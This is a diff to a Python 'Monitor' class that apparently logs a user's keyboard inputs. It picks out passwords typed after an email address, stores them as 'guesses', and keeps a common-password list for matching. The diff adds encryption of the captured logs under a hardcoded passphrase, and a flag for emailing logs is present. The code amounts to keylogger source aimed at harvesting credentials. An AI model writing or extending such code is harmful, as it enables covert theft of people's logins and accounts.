@@ -117,18 +117,22 @@ class Monitor:
         self.passphrase = 'fishing-in-the-river-champion'
         self.log_via_email = False
 
+        # suffixes
+
         self.log_folder = 'logs'
         # the guesses will have the same name as normal log files, but they will have this suffix at the end of their name
         self.guess_suffix = 'special'
         # the interpreted log file will have this suffix
         self.interpreted = 'interpreted'
-        self.password_set = {"123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","696969","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","pussy","superman","1qaz2wsx","7777777","fuckyou","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","fuckme","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","asshole","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","fuck","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","6969","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","minecraft"}
+        # applications
+        self.apps = 'apps'
 
         # state variables
         self.logs = list()
         self.text = str()
     
         # for password guessing
+        self.password_set = {"123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","696969","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","pussy","superman","1qaz2wsx","7777777","fuckyou","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","fuckme","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","asshole","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","fuck","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","6969","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","minecraft"}
         
         # logs of all inputs filtered out using special rules outlined in 4.2
         self.guess_logs = list()
@@ -183,7 +187,6 @@ class Monitor:
             
             text = item['o']
             if is_email(text):
-                print(self.guess_logs[idx + 1:])
                 password = find_next_password(self.guess_logs[idx + 1:])
                 if password:
                     self.guesses.append(password)
@@ -203,7 +206,10 @@ class Monitor:
         for contents, suffix in zip([self.guesses, self.guess_logs], [self.guess_suffix, self.interpreted]):
             json_string = json.dumps(contents, indent=4)
             filename = f'{self.log_folder}/{right_now} {suffix}.json'
-            write_normal_file(json_string, filename)
+            if self.encrypt_logfiles:
+                write_encrypted_file(json_string, self.passphrase, filename)
+            else:
+                write_normal_file(json_string, filename)
 
             contents = list()
     
